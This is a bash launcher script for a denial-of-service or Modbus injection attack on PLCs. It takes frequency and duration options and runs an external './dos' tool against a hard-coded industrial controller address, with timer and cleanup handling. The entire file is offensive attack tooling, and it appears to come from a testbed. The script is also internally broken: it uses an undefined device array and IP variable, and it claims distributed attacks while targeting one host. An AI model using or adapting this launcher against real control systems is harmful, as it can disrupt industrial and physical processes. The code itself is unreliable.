#!/bin/bash

# Function to handle the termination signal (Ctrl+C)
cleanup() {
    echo "Stopping all attacks..."
    # Kill all background jobs
    kill $(jobs -p) 2>/dev/null
    wait
    echo "All attacks have been stopped."
    exit 0
}

# Set trap to call cleanup function on SIGINT (Ctrl+C)
trap cleanup SIGINT

# Display help information
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo "Launch distributed Modbus injection attacks across a network."
    echo ""
    echo "Required options:"
    echo "  -f, --frequency FREQ     Attack frequency in packets per second"
    echo ""
    echo "Optional options:"
    echo "  -d, --duration TIME      Attack duration in seconds (default: 0 = infinite)"
    echo "  -h, --help               Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -f 20 -d 60           # Attack for 60 seconds at 20 pps"
    echo "  $0 --frequency 30 --duration 120"
    exit 0
}

# Default values
attack_duration=0

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -f|--frequency) attack_frequency="$2"; shift ;;
        -d|--duration) attack_duration="$2"; shift ;;
        -h|--help) show_help ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Check if frequency is provided
if [ -z "$attack_frequency" ]; then
    echo "Error: Attack frequency (-f) is required."
    show_help
fi

# Launch attacks in parallel
if [ "$attack_duration" -gt 0 ]; then
    # Start a timer to kill all processes after duration
    (
        sleep "$attack_duration"
        echo "Attack duration ($attack_duration seconds) completed. Stopping all attacks..."
        kill $$ 2>/dev/null  # Send SIGTERM to main process
    ) &
    timer_pid=$!
else
    echo "Starting attacks on ${#plc_ips[@]} devices with $attack_frequency packets/sec..."
fi

echo "Launching attack on PLC at $ip"
./dos -h "192.168.60.3" -f "$attack_frequency" &


# Wait for all background processes
wait

# Clean up timer if it's still running
if [ -n "$timer_pid" ]; then
    kill $timer_pid 2>/dev/null
fi

echo "All attacks completed."